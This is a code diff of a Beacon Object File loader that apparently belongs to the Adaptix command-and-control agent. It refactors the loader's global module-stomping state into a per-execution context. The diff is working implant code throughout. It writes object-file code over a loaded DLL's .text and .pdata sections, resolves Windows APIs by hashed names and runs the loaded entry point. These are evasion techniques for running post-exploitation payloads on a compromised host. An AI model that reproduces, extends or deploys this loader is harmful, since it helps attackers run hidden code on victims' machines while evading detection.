@@ -2,6 +2,7 @@
 #include "ProcLoader.h"
 #include "utils.h"
 #include "Boffer.h"
+#include "config.h"
 
 #define llabs(n) ((n) < 0 ? -(n) : (n))
 
@@ -12,152 +13,143 @@ int IMP_LENGTH = 7;
 #endif
 
 int my_strncpy_s(char* dest, unsigned int destsz, const char* src, unsigned int count) {
-	if (!dest || !src) return 1;
-	if (destsz == 0)   return 2;
+    if (!dest || !src) return 1;
+    if (destsz == 0)   return 2;
 
-	unsigned int i = 0;
-	for (; i < count && i < destsz - 1 && src[i] != '\0'; ++i)
-		dest[i] = src[i];
+    unsigned int i = 0;
+    for (; i < count && i < destsz - 1 && src[i] != '\0'; ++i)
+        dest[i] = src[i];
 
-	if (i < count && src[i] != '\0') {
-		dest[0] = '\0';
-		return 3;
-	}
-	dest[i] = '\0';
-	return 0;
+    if (i < count && src[i] != '\0') {
+        dest[0] = '\0';
+        return 3;
+    }
+    dest[i] = '\0';
+    return 0;
 }
 
-void InitBofOutputData()
-{
-	if (bofOutputPacker == NULL)
-		bofOutputPacker = new Packer();
-}
 
 #define BEACON_FUNCTIONS_COUNT 32
 
 BOF_API BeaconFunctions[BEACON_FUNCTIONS_COUNT] = {
 
-	/// 5 - Data Parser API
+    /// 5 - Data Parser API
 
-	{ HASH_FUNC_BEACONDATAPARSE,              (LPVOID) BeaconDataParse },
-	{ HASH_FUNC_BEACONDATAINT,                (LPVOID) BeaconDataInt },
-	{ HASH_FUNC_BEACONDATASHORT,              (LPVOID) BeaconDataShort },
-	{ HASH_FUNC_BEACONDATALENGTH,             (LPVOID) BeaconDataLength },
-	{ HASH_FUNC_BEACONDATAEXTRACT,            (LPVOID) BeaconDataExtract },
+    { HASH_FUNC_BEACONDATAPARSE,              (LPVOID) BeaconDataParse },
+    { HASH_FUNC_BEACONDATAINT,                (LPVOID) BeaconDataInt },
+    { HASH_FUNC_BEACONDATASHORT,              (LPVOID) BeaconDataShort },
+    { HASH_FUNC_BEACONDATALENGTH,             (LPVOID) BeaconDataLength },
+    { HASH_FUNC_BEACONDATAEXTRACT,            (LPVOID) BeaconDataExtract },
 
-	/// 2 - Output API
+    /// 2 - Output API
 
-	{ HASH_FUNC_BEACONOUTPUT,                 (LPVOID) BeaconOutput },
-	{ HASH_FUNC_BEACONPRINTF,                 (LPVOID) BeaconPrintf },
+    { HASH_FUNC_BEACONOUTPUT,                 (LPVOID) BeaconOutput },
+    { HASH_FUNC_BEACONPRINTF,                 (LPVOID) BeaconPrintf },
 
-	/// 7 - Format API
+    /// 7 - Format API
 
-	{ HASH_FUNC_BEACONFORMATALLOC,            (LPVOID) BeaconFormatAlloc },
-	{ HASH_FUNC_BEACONFORMATRESET,            (LPVOID) BeaconFormatReset },
-	{ HASH_FUNC_BEACONFORMATAPPEND,           (LPVOID) BeaconFormatAppend },
-	{ HASH_FUNC_BEACONFORMATPRINTF,           (LPVOID) BeaconFormatPrintf },
-	{ HASH_FUNC_BEACONFORMATTOSTRING,         (LPVOID) BeaconFormatToString },
-	{ HASH_FUNC_BEACONFORMATFREE,             (LPVOID) BeaconFormatFree },
-	{ HASH_FUNC_BEACONFORMATINT,              (LPVOID) BeaconFormatInt },
+    { HASH_FUNC_BEACONFORMATALLOC,            (LPVOID) BeaconFormatAlloc },
+    { HASH_FUNC_BEACONFORMATRESET,            (LPVOID) BeaconFormatReset },
+    { HASH_FUNC_BEACONFORMATAPPEND,           (LPVOID) BeaconFormatAppend },
+    { HASH_FUNC_BEACONFORMATPRINTF,           (LPVOID) BeaconFormatPrintf },
+    { HASH_FUNC_BEACONFORMATTOSTRING,         (LPVOID) BeaconFormatToString },
+    { HASH_FUNC_BEACONFORMATFREE,             (LPVOID) BeaconFormatFree },
+    { HASH_FUNC_BEACONFORMATINT,              (LPVOID) BeaconFormatInt },
 
-	/// 7 - Internal APIs
+    /// 7 - Internal APIs
 
-	{ HASH_FUNC_BEACONUSETOKEN,               (LPVOID) BeaconUseToken },
-	{ HASH_FUNC_BEACONREVERTTOKEN,            (LPVOID) BeaconRevertToken },
-	{ HASH_FUNC_BEACONISADMIN,                (LPVOID) BeaconIsAdmin },
-	//{ HASH_FUNC_BEACONGETSPAWNTO,             BeaconGetSpawnTo },
-	//{ HASH_FUNC_BEACONSPAWNTEMPORARYPROCESS,  BeaconSpawnTemporaryProcess },
-	//{ HASH_FUNC_BEACONINJECTPROCESS,          BeaconInjectProcess },
-	//{ HASH_FUNC_BEACONINJECTTEMPORARYPROCESS, BeaconInjectTemporaryProcess },
-	//{ HASH_FUNC_BEACONCLEANUPPROCESS,         BeaconCleanupProcess },
-	//{ HASH_FUNC_BEACONINFORMATION,            BeaconInformation },
-	{ HASH_FUNC_TOWIDECHAR,					  (LPVOID) toWideChar },
-	{ HASH_FUNC_BEACONADDVALUE,               (LPVOID) BeaconAddValue },
-	{ HASH_FUNC_BEACONGETVALUE,               (LPVOID) BeaconGetValue },
-	{ HASH_FUNC_BEACONREMOVEVALUE,            (LPVOID) BeaconRemoveValue },
+    { HASH_FUNC_BEACONUSETOKEN,               (LPVOID) BeaconUseToken },
+    { HASH_FUNC_BEACONREVERTTOKEN,            (LPVOID) BeaconRevertToken },
+    { HASH_FUNC_BEACONISADMIN,                (LPVOID) BeaconIsAdmin },
+    { HASH_FUNC_TOWIDECHAR,                   (LPVOID) toWideChar },
+    { HASH_FUNC_BEACONADDVALUE,               (LPVOID) BeaconAddValue },
+    { HASH_FUNC_BEACONGETVALUE,               (LPVOID) BeaconGetValue },
+    { HASH_FUNC_BEACONREMOVEVALUE,            (LPVOID) BeaconRemoveValue },
 
-	/// 2 - Adaptix APIs
-	{ HASH_FUNC_AXADDSCREENSHOT,  (LPVOID) AxAddScreenshot },
-	{ HASH_FUNC_AXDOWNLOADMEMORY, (LPVOID) AxDownloadMemory },
+    /// 2 - Adaptix APIs
+    { HASH_FUNC_AXADDSCREENSHOT,  (LPVOID) AxAddScreenshot },
+    { HASH_FUNC_AXDOWNLOADMEMORY, (LPVOID) AxDownloadMemory },
 
-	/// 3 - Async BOF APIs
-	{ HASH_FUNC_BEACONREGISTERTHREADCALLBACK,   (LPVOID) BeaconRegisterThreadCallback },
-	{ HASH_FUNC_BEACONUNREGISTERTHREADCALLBACK, (LPVOID) BeaconUnregisterThreadCallback },
-	{ HASH_FUNC_BEACONWAKEUP,                   (LPVOID) BeaconWakeup },
-	{ HASH_FUNC_BEACONGETSTOPJOBEVENT,          (LPVOID) BeaconGetStopJobEvent },
+    /// 3 - Async BOF APIs
+    { HASH_FUNC_BEACONREGISTERTHREADCALLBACK,   (LPVOID) BeaconRegisterThreadCallback },
+    { HASH_FUNC_BEACONUNREGISTERTHREADCALLBACK, (LPVOID) BeaconUnregisterThreadCallback },
+    { HASH_FUNC_BEACONWAKEUP,                   (LPVOID) BeaconWakeup },
+    { HASH_FUNC_BEACONGETSTOPJOBEVENT,          (LPVOID) BeaconGetStopJobEvent },
 
-	/// 5 - Other APIs
+    /// 5 - Other APIs
 
-	{ HASH_FUNC_LOADLIBRARYA,                 (LPVOID) proxy_LoadLibraryA },
-	{ HASH_FUNC_GETMODULEHANDLEA,             (LPVOID) proxy_GetModuleHandleA },
-	{ HASH_FUNC_FREELIBRARY,                  (LPVOID) proxy_FreeLibrary },
-	{ HASH_FUNC_GETPROCADDRESS,				  (LPVOID) proxy_GetProcAddress },
-	{ HASH_FUNC___C_SPECIFIC_HANDLER,         NULL }, // GetProcAddress(kern, "__C_specific_handler");
+    { HASH_FUNC_LOADLIBRARYA,                 (LPVOID) proxy_LoadLibraryA },
+    { HASH_FUNC_GETMODULEHANDLEA,             (LPVOID) proxy_GetModuleHandleA },
+    { HASH_FUNC_FREELIBRARY,                  (LPVOID) proxy_FreeLibrary },
+    { HASH_FUNC_GETPROCADDRESS,               (LPVOID) proxy_GetProcAddress },
+    { HASH_FUNC___C_SPECIFIC_HANDLER,         NULL },
 };
 
 void* FindProcBySymbol(char* symbol)
 {
-	if ( StrLenA(symbol) > IMP_LENGTH) {
-		ULONG funcHash = Djb2A((PUCHAR) symbol + IMP_LENGTH);
-		for (int i = 0; i < BEACON_FUNCTIONS_COUNT; i++) {
-			if (funcHash == BeaconFunctions[i].hash) {
-				if ( BeaconFunctions[i].proc != NULL ) 
-					return BeaconFunctions[i].proc;
-			}
-		}
+    if ( StrLenA(symbol) > IMP_LENGTH) {
+        ULONG funcHash = Djb2A((PUCHAR) symbol + IMP_LENGTH);
+        for (int i = 0; i < BEACON_FUNCTIONS_COUNT; i++) {
+            if (funcHash == BeaconFunctions[i].hash) {
+                if ( BeaconFunctions[i].proc != NULL )
+                    return BeaconFunctions[i].proc;
+            }
+        }
 
-		char symbolCopy[1024] = { 0 };
-		memcpy(symbolCopy, symbol, StrLenA(symbol));
+        char symbolCopy[1024] = { 0 };
+        memcpy(symbolCopy, symbol, StrLenA(symbol));
 
-		CHAR c1[] = { '$',0 };
-		CHAR c2[] = { '@',0 };
+        CHAR c1[] = { '$',0 };
+        CHAR c2[] = { '@',0 };
 
-		char* moduleName = symbolCopy + IMP_LENGTH;
-		moduleName = StrTokA(moduleName, c1);
+        char* moduleName = symbolCopy + IMP_LENGTH;
+        moduleName = StrTokA(moduleName, c1);
 
-		char* funcName = StrTokA(NULL, c1);
-		funcName = StrTokA(funcName, c2);
+        char* funcName = StrTokA(NULL, c1);
+        funcName = StrTokA(funcName, c2);
 
-		funcHash = Djb2A((PUCHAR)funcName);
-		HMODULE hModule = ApiWin->LoadLibraryA(moduleName);
-		
-		memset(symbolCopy, 0, StrLenA(symbol));
+        funcHash = Djb2A((PUCHAR)funcName);
+        HMODULE hModule = ApiWin->LoadLibraryA(moduleName);
 
-		if (hModule) 
-			return GetSymbolAddress(hModule, funcHash);
-	}
+        memset(symbolCopy, 0, StrLenA(symbol));
 
-	return NULL;
+        if (hModule)
+            return GetSymbolAddress(hModule, funcHash);
+    }
+
+    return NULL;
 }
 
 char* PrepareEntryName(char* targetFuncName)
 {
 #if defined(__x86_64__) || defined(_WIN64)
-	return targetFuncName;
+    return targetFuncName;
 #else
-	int targetLength = StrLenA(targetFuncName);
-	char* entryName = (char*)MemAllocLocal(targetLength + 2);
-	if (!entryName)
-		return NULL;
+    int targetLength = StrLenA(targetFuncName);
+    char* entryName = (char*)MemAllocLocal(targetLength + 2);
+    if (!entryName)
+        return NULL;
 
-	entryName[0] = '_';
-	memcpy(entryName + 1, targetFuncName, targetLength + 1);
-	return entryName;
+    entryName[0] = '_';
+    memcpy(entryName + 1, targetFuncName, targetLength + 1);
+    return entryName;
 #endif
 }
 
 void FreeFunctionName(char* targetFuncName)
 {
 #if !defined(__x86_64__) && !defined(_WIN64)
-	MemFreeLocal((LPVOID*) & targetFuncName, StrLenA(targetFuncName));
+    MemFreeLocal((LPVOID*) & targetFuncName, StrLenA(targetFuncName));
 #endif
 }
 
-bool AllocateSections(unsigned char* coffFile, COF_HEADER* pHeader, PCHAR* mapSections, LPVOID* outMapFunctions)
+bool AllocateSections(unsigned char* coffFile, COF_HEADER* pHeader,
+                      PCHAR* mapSections, LPVOID* outMapFunctions,
+                      BOF_STOMP_CTX* stompCtx)
 {
     *outMapFunctions = NULL;
 
-    if (g_BofStomp.initialised) {
+    if (stompCtx && stompCtx->initialised) {
 
         DWORD totalSize = 0;
         for (int i = 0; i < pHeader->NumberOfSections; i++) {
@@ -167,21 +159,18 @@ bool AllocateSections(unsigned char* coffFile, COF_HEADER* pHeader, PCHAR* mapSe
         }
         totalSize += MAP_FUNCTIONS_SIZE;
 
-        ApiWin->EnterCriticalSection(&g_BofStomp.lock);
-
-        if (g_BofStomp.inUse || totalSize > (DWORD)g_BofStomp.textSize) {
-
-            ApiWin->LeaveCriticalSection(&g_BofStomp.lock);
+        if (totalSize > (DWORD)stompCtx->textSize) {
+            // BOF doesn't fit — fall through to VirtualAlloc
             goto fallback;
         }
 
         DWORD oldProt = 0;
-        if (!ApiWin->VirtualProtect(g_BofStomp.textBase, totalSize, PAGE_EXECUTE_READWRITE, &oldProt)) {
-            ApiWin->LeaveCriticalSection(&g_BofStomp.lock);
+        if (!ApiWin->VirtualProtect(stompCtx->textBase, totalSize,
+                                    PAGE_EXECUTE_READWRITE, &oldProt)) {
             goto fallback;
         }
 
-        char* cursor = (char*)g_BofStomp.textBase;
+        char* cursor = (char*)stompCtx->textBase;
         for (int i = 0; i < pHeader->NumberOfSections; i++) {
             COF_SECTION* s = (COF_SECTION*)(coffFile + sizeof(COF_HEADER) + sizeof(COF_SECTION) * i);
             DWORD slotSize = ALIGN_UP((DWORD)s->SizeOfRawData + UNWIND_SLOT_SIZE, 16);
@@ -202,20 +191,21 @@ bool AllocateSections(unsigned char* coffFile, COF_HEADER* pHeader, PCHAR* mapSe
         memset(cursor, 0, MAP_FUNCTIONS_SIZE);
         *outMapFunctions = cursor;
 
-        g_BofStomp.cursorBase = g_BofStomp.textBase;
-        g_BofStomp.cursorSize = totalSize;
-        g_BofStomp.inUse      = TRUE;
+        stompCtx->cursorBase = stompCtx->textBase;
+        stompCtx->cursorSize = totalSize;
+        stompCtx->inUse      = TRUE;
 
         return true;
     }
 
 fallback:
-
     for (int i = 0; i < pHeader->NumberOfSections; i++) {
         COF_SECTION* s = (COF_SECTION*)(coffFile + sizeof(COF_HEADER) + sizeof(COF_SECTION) * i);
         DWORD allocSize = (DWORD)s->SizeOfRawData + UNWIND_SLOT_SIZE;
 
-        mapSections[i] = (char*)ApiWin->VirtualAlloc(NULL, allocSize, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
+        mapSections[i] = (char*)ApiWin->VirtualAlloc(NULL, allocSize,
+                                                      MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN,
+                                                      PAGE_EXECUTE_READWRITE);
         if (!mapSections[i] && s->SizeOfRawData)
             return false;
 
@@ -225,7 +215,9 @@ fallback:
             memcpy(mapSections[i], coffFile + s->PointerToRawData, s->SizeOfRawData);
     }
 
-    *outMapFunctions = ApiWin->VirtualAlloc(NULL, MAP_FUNCTIONS_SIZE, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
+    *outMapFunctions = ApiWin->VirtualAlloc(NULL, MAP_FUNCTIONS_SIZE,
+                                            MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN,
+                                            PAGE_EXECUTE_READWRITE);
     if (!*outMapFunctions) {
         for (int i = 0; i < pHeader->NumberOfSections; i++) {
             if (mapSections[i]) {
@@ -239,67 +231,58 @@ fallback:
     return true;
 }
 
-void CleanupSections(PCHAR* mapSections, int maxSections, LPVOID mapFunctions)
+void CleanupSections(PCHAR* mapSections, int maxSections, LPVOID mapFunctions,
+                     BOF_STOMP_CTX* stompCtx)
 {
+    if (stompCtx && stompCtx->initialised && stompCtx->inUse) {
 
-    BOOL stomped = FALSE;
-    if (g_BofStomp.initialised && g_BofStomp.inUse) {
-
-        for (int i = 0; i < maxSections; i++) {
-            if (mapSections[i]) {
-                ULONG_PTR sectionVA  = (ULONG_PTR)mapSections[i];
-                ULONG_PTR stompStart = (ULONG_PTR)g_BofStomp.textBase;
-                ULONG_PTR stompEnd   = stompStart + g_BofStomp.textSize;
-                if (sectionVA >= stompStart && sectionVA < stompEnd) {
-                    stomped = TRUE;
-                }
-                break;
-            }
-        }
-    }
-
-    if (stomped) {
-        if (g_BofStomp.pdataStomped &&
-            g_BofStomp.savedPdata &&
-            g_BofStomp.pdataBase &&
-            g_BofStomp.pdataSize) {
+        // Restore .pdata if needed (may have already been done by ExecuteProc)
+        if (stompCtx->pdataStomped &&
+            stompCtx->savedPdata &&
+            stompCtx->pdataBase &&
+            stompCtx->pdataSize) {
             DWORD pdProt = 0;
-            if (ApiWin->VirtualProtect(g_BofStomp.pdataBase, g_BofStomp.pdataSize, PAGE_READWRITE, &pdProt)) {
-                memcpy(g_BofStomp.pdataBase, g_BofStomp.savedPdata, g_BofStomp.pdataSize);
+            if (ApiWin->VirtualProtect(stompCtx->pdataBase, stompCtx->pdataSize,
+                                       PAGE_READWRITE, &pdProt)) {
+                memcpy(stompCtx->pdataBase, stompCtx->savedPdata, stompCtx->pdataSize);
                 DWORD pdTmp = 0;
-                ApiWin->VirtualProtect(g_BofStomp.pdataBase, g_BofStomp.pdataSize, pdProt, &pdTmp);
+                ApiWin->VirtualProtect(stompCtx->pdataBase, stompCtx->pdataSize, pdProt, &pdTmp);
             }
-            g_BofStomp.pdataStomped = FALSE;
+            stompCtx->pdataStomped = FALSE;
         }
 
+        // Restore original .text bytes
         DWORD oldProt = 0;
-        ApiWin->VirtualProtect(g_BofStomp.cursorBase, g_BofStomp.cursorSize, PAGE_EXECUTE_READWRITE, &oldProt);
-
-        memset(g_BofStomp.cursorBase, 0, g_BofStomp.cursorSize);
-
-        memcpy(g_BofStomp.cursorBase, g_BofStomp.savedBytes, g_BofStomp.cursorSize);
-
-        ApiWin->VirtualProtect(g_BofStomp.cursorBase, g_BofStomp.cursorSize, PAGE_EXECUTE_READ, &oldProt);
+        ApiWin->VirtualProtect(stompCtx->cursorBase, stompCtx->cursorSize,
+                               PAGE_EXECUTE_READWRITE, &oldProt);
+        memset(stompCtx->cursorBase, 0, stompCtx->cursorSize);
+        memcpy(stompCtx->cursorBase, stompCtx->savedBytes, stompCtx->cursorSize);
+        ApiWin->VirtualProtect(stompCtx->cursorBase, stompCtx->cursorSize,
+                               PAGE_EXECUTE_READ, &oldProt);
 
         for (int i = 0; i < maxSections; i++)
             mapSections[i] = NULL;
 
-        g_BofStomp.cursorBase = NULL;
-        g_BofStomp.cursorSize = 0;
-        g_BofStomp.inUse      = FALSE;
-        ApiWin->LeaveCriticalSection(&g_BofStomp.lock);
+        stompCtx->cursorBase = NULL;
+        stompCtx->cursorSize = 0;
+        stompCtx->inUse      = FALSE;
+
+        // Destroy the per-execution context (unmaps DLL, frees saved bytes, etc.)
+        BofStompDestroy(stompCtx);
 
     } else {
-
+        // VirtualAlloc path
         for (int i = 0; i < maxSections; i++) {
             if (mapSections[i]) {
                 ApiWin->VirtualFree(mapSections[i], 0, MEM_RELEASE);
                 mapSections[i] = NULL;
             }
         }
-        if (mapFunctions) {
+        if (mapFunctions)
             ApiWin->VirtualFree(mapFunctions, 0, MEM_RELEASE);
-        }
+
+        if (stompCtx)
+            BofStompDestroy(stompCtx);
     }
 }
 
@@ -317,12 +300,12 @@ bool ProcessRelocations(unsigned char* coffFile, COF_HEADER* pHeader, PCHAR* map
 
         for (int relocIndex = 0; relocIndex < pSection->NumberOfRelocations; relocIndex++) {
             COF_SYMBOL pSymbol = pSymbolTable[pRelocTable->SymbolTableIndex];
-            if (pRelocTable->SymbolTableIndex >= pHeader->NumberOfSymbols) {
+            if (pRelocTable->SymbolTableIndex >= (DWORD)pHeader->NumberOfSymbols) {
                 BeaconOutput(BOF_ERROR_PARSE, NULL, 0);
                 return FALSE;
             }
 
-            int   offset     = 0;
+            int   offset      = 0;
             void* procAddress = NULL;
 #ifdef _WIN64
             unsigned long long bigOffset = 0;
@@ -332,7 +315,8 @@ bool ProcessRelocations(unsigned char* coffFile, COF_HEADER* pHeader, PCHAR* map
                 procSymbol = ((char*)(pSymbolTable + pHeader->NumberOfSymbols)) + pSymbol.Name.dwName[1];
             } else {
                 if (pSymbol.Name.cName[7] != 0) {
-                    my_strncpy_s(procSymbolShort, sizeof(procSymbolShort), pSymbol.Name.cName, sizeof(pSymbol.Name.cName));
+                    my_strncpy_s(procSymbolShort, sizeof(procSymbolShort),
+                                 pSymbol.Name.cName, sizeof(pSymbol.Name.cName));
                     procSymbol = procSymbolShort;
                 } else {
                     procSymbol = pSymbol.Name.cName;
@@ -363,14 +347,19 @@ bool ProcessRelocations(unsigned char* coffFile, COF_HEADER* pHeader, PCHAR* map
             if (status != FALSE) {
 #ifdef _WIN64
                 if (pRelocTable->Type == IMAGE_REL_AMD64_ADDR64) {
-                    memcpy(&bigOffset, mapSections[sectionIndex] + pRelocTable->VirtualAddress, sizeof(unsigned long long));
+                    memcpy(&bigOffset, mapSections[sectionIndex] + pRelocTable->VirtualAddress,
+                           sizeof(unsigned long long));
                     bigOffset += (unsigned long long)procAddress;
-                    memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress, &bigOffset, sizeof(unsigned long long));
+                    memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress,
+                           &bigOffset, sizeof(unsigned long long));
                 } else if (pRelocTable->Type == IMAGE_REL_AMD64_ADDR32NB) {
-
-                    memcpy(&offset, mapSections[sectionIndex] + pRelocTable->VirtualAddress, sizeof(int));
-                    offset += (int)((char*)mapSections[pSymbol.SectionNumber - 1] - (char*)mapSections[0]) + pSymbolTable[pRelocTable->SymbolTableIndex].Value;
-                    memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress, &offset, sizeof(int));
+                    memcpy(&offset, mapSections[sectionIndex] + pRelocTable->VirtualAddress,
+                           sizeof(int));
+                    offset += (int)((char*)mapSections[pSymbol.SectionNumber - 1] -
+                                    (char*)mapSections[0]) +
+                              pSymbolTable[pRelocTable->SymbolTableIndex].Value;
+                    memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress,
+                           &offset, sizeof(int));
                 } else if (pRelocTable->Type == IMAGE_REL_AMD64_REL32 ||
                            pRelocTable->Type == IMAGE_REL_AMD64_REL32_1 ||
                            pRelocTable->Type == IMAGE_REL_AMD64_REL32_2 ||
@@ -381,24 +370,35 @@ bool ProcessRelocations(unsigned char* coffFile, COF_HEADER* pHeader, PCHAR* map
                     int typeIndex = pRelocTable->Type - 4;
                     memcpy(&offset, mapSections[sectionIndex] + pRelocTable->VirtualAddress,
                            sizeof(int));
-                    if (llabs((long long)procAddress - (long long)(mapSections[sectionIndex] + pRelocTable->VirtualAddress + 4 + typeIndex))
+                    if (llabs((long long)procAddress -
+                              (long long)(mapSections[sectionIndex] +
+                                          pRelocTable->VirtualAddress + 4 + typeIndex))
                         > UINT_MAX) {
                         return FALSE;
                     }
-                    offset += ((size_t)procAddress - ((size_t)mapSections[sectionIndex] + pRelocTable->VirtualAddress + 4 + typeIndex));
-                    memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress, &offset, sizeof(int));
+                    offset += ((size_t)procAddress -
+                               ((size_t)mapSections[sectionIndex] +
+                                pRelocTable->VirtualAddress + 4 + typeIndex));
+                    memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress,
+                           &offset, sizeof(int));
                 }
 #else
                 if (pRelocTable->Type == IMAGE_REL_I386_DIR32) {
                     offset = 0;
-                    memcpy(&offset, mapSections[sectionIndex] + pRelocTable->VirtualAddress, sizeof(int));
+                    memcpy(&offset, mapSections[sectionIndex] + pRelocTable->VirtualAddress,
+                           sizeof(int));
                     offset = (unsigned int)procAddress + offset;
-                    memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress, &offset, sizeof(unsigned int));
+                    memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress,
+                           &offset, sizeof(unsigned int));
                 } else if (pRelocTable->Type == IMAGE_REL_I386_REL32) {
                     offset = 0;
-                    memcpy(&offset, mapSections[sectionIndex] + pRelocTable->VirtualAddress, sizeof(int));
-                    offset = (unsigned int)procAddress - (unsigned int)(mapSections[sectionIndex] + pRelocTable->VirtualAddress + 4);
-                    memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress, &offset, sizeof(unsigned int));
+                    memcpy(&offset, mapSections[sectionIndex] + pRelocTable->VirtualAddress,
+                           sizeof(int));
+                    offset = (unsigned int)procAddress -
+                             (unsigned int)(mapSections[sectionIndex] +
+                                            pRelocTable->VirtualAddress + 4);
+                    memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress,
+                           &offset, sizeof(unsigned int));
                 }
 #endif
             }
@@ -408,7 +408,9 @@ bool ProcessRelocations(unsigned char* coffFile, COF_HEADER* pHeader, PCHAR* map
     return status;
 }
 
-void ExecuteProc(char* entryFuncName, unsigned char* args, int argsSize, COF_SYMBOL* pSymbolTable, COF_HEADER* pHeader, PCHAR* mapSections)
+void ExecuteProc(char* entryFuncName, unsigned char* args, int argsSize,
+                 COF_SYMBOL* pSymbolTable, COF_HEADER* pHeader, PCHAR* mapSections,
+                 BOF_STOMP_CTX* stompCtx)
 {
 #ifdef _WIN64
     BOF_RUNTIME_FUNCTION* rfEntries       = NULL;
@@ -416,11 +418,12 @@ void ExecuteProc(char* entryFuncName, unsigned char* args, int argsSize, COF_SYM
     int                   registeredCount = 0;
     BOOL                  wroteInPlace    = FALSE;
 #endif
-    BOOL                  entryFound      = FALSE;
+    BOOL entryFound = FALSE;
 
 #ifdef _WIN64
     for (int si = 0; si < pHeader->NumberOfSections; si++) {
-        COF_SECTION* s = (COF_SECTION*)((unsigned char*)pHeader + sizeof(COF_HEADER) + sizeof(COF_SECTION) * si);
+        COF_SECTION* s = (COF_SECTION*)((unsigned char*)pHeader + sizeof(COF_HEADER) +
+                                        sizeof(COF_SECTION) * si);
 
         if (memcmp(s->Name, ".pdata\0\0", 8) != 0) continue;
         if (!s->SizeOfRawData || !s->PointerToRawData) break;
@@ -434,13 +437,15 @@ void ExecuteProc(char* entryFuncName, unsigned char* args, int argsSize, COF_SYM
 
         memcpy(bofPdata, (unsigned char*)pHeader + s->PointerToRawData, bofPdataSize);
 
-        BOOL      stompInPlace = (g_BofStomp.initialised &&
-                                  g_BofStomp.inUse &&
-                                  g_BofStomp.pdataBase &&
-                                  g_BofStomp.moduleBase &&
-                                  numEntries <= (int)g_BofStomp.pdataCapacity);
-        ULONG_PTR rvaBase      = stompInPlace ? (ULONG_PTR)g_BofStomp.moduleBase
-                                              : (ULONG_PTR)mapSections[0];
+        BOOL stompInPlace = (stompCtx &&
+                             stompCtx->initialised &&
+                             stompCtx->inUse &&
+                             stompCtx->pdataBase &&
+                             stompCtx->moduleBase &&
+                             numEntries <= (int)stompCtx->pdataCapacity);
+
+        ULONG_PTR rvaBase = stompInPlace ? (ULONG_PTR)stompCtx->moduleBase
+                                         : (ULONG_PTR)mapSections[0];
 
         COF_RELOCATION* relocs = (COF_RELOCATION*)((unsigned char*)pHeader + s->PointerToRelocations);
         for (int ri = 0; ri < s->NumberOfRelocations; ri++) {
@@ -470,6 +475,7 @@ void ExecuteProc(char* entryFuncName, unsigned char* args, int argsSize, COF_SYM
         }
 
         if (stompInPlace) {
+            // Sort entries by BeginAddress (insertion sort — small N)
             for (int a = 1; a < numEntries; a++) {
                 BOF_RUNTIME_FUNCTION key = bofPdata[a];
                 int b = a - 1;
@@ -481,19 +487,20 @@ void ExecuteProc(char* entryFuncName, unsigned char* args, int argsSize, COF_SYM
             }
 
             DWORD oldProt = 0;
-            if (ApiWin->VirtualProtect(g_BofStomp.pdataBase, g_BofStomp.pdataSize, PAGE_READWRITE, &oldProt)) {
-                BOF_RUNTIME_FUNCTION* dst = (BOF_RUNTIME_FUNCTION*)g_BofStomp.pdataBase;
+            if (ApiWin->VirtualProtect(stompCtx->pdataBase, stompCtx->pdataSize,
+                                       PAGE_READWRITE, &oldProt)) {
+                BOF_RUNTIME_FUNCTION* dst = (BOF_RUNTIME_FUNCTION*)stompCtx->pdataBase;
                 memcpy(dst, bofPdata, (DWORD)numEntries * sizeof(BOF_RUNTIME_FUNCTION));
 
-                for (DWORD k = (DWORD)numEntries; k < g_BofStomp.pdataCapacity; k++) {
+                for (DWORD k = (DWORD)numEntries; k < stompCtx->pdataCapacity; k++) {
                     dst[k].BeginAddress = 0xFFFFFFFF;
                     dst[k].EndAddress   = 0xFFFFFFFF;
                     dst[k].UnwindData   = 0;
                 }
 
                 DWORD tmp = 0;
-                ApiWin->VirtualProtect(g_BofStomp.pdataBase, g_BofStomp.pdataSize, oldProt, &tmp);
-                g_BofStomp.pdataStomped = TRUE;
+                ApiWin->VirtualProtect(stompCtx->pdataBase, stompCtx->pdataSize, oldProt, &tmp);
+                stompCtx->pdataStomped = TRUE;
                 wroteInPlace = TRUE;
             }
 
@@ -513,12 +520,13 @@ void ExecuteProc(char* entryFuncName, unsigned char* args, int argsSize, COF_SYM
             MemFreeLocal((LPVOID*)&bofPdata, bofPdataSize);
         break;
     }
-
-#endif
+#endif // _WIN64
 
     for (int i = 0; i < pHeader->NumberOfSymbols; i++) {
         if (StrCmpA(pSymbolTable[i].Name.cName, entryFuncName) == 0) {
-            void(*proc)(char*, unsigned long) = (void(*)(char*, unsigned long)) (mapSections[pSymbolTable[i].SectionNumber - 1] + pSymbolTable[i].Value);
+            void(*proc)(char*, unsigned long) =
+                (void(*)(char*, unsigned long))(mapSections[pSymbolTable[i].SectionNumber - 1] +
+                                                pSymbolTable[i].Value);
             proc((char*)args, argsSize);
             entryFound = TRUE;
             break;
@@ -535,23 +543,23 @@ void ExecuteProc(char* entryFuncName, unsigned char* args, int argsSize, COF_SYM
         }
     }
 
+    // Restore .pdata if we wrote it in-place (sync BOF path)
     if (wroteInPlace &&
-        g_BofStomp.pdataStomped &&
-        g_BofStomp.savedPdata &&
-        g_BofStomp.pdataBase &&
-        g_BofStomp.pdataSize) {
+        stompCtx &&
+        stompCtx->pdataStomped &&
+        stompCtx->savedPdata &&
+        stompCtx->pdataBase &&
+        stompCtx->pdataSize) {
         DWORD oldProt = 0;
-        if (ApiWin->VirtualProtect(g_BofStomp.pdataBase, g_BofStomp.pdataSize, PAGE_READWRITE, &oldProt)) {
-            memcpy(g_BofStomp.pdataBase, g_BofStomp.savedPdata, g_BofStomp.pdataSize);
+        if (ApiWin->VirtualProtect(stompCtx->pdataBase, stompCtx->pdataSize,
+                                   PAGE_READWRITE, &oldProt)) {
+            memcpy(stompCtx->pdataBase, stompCtx->savedPdata, stompCtx->pdataSize);
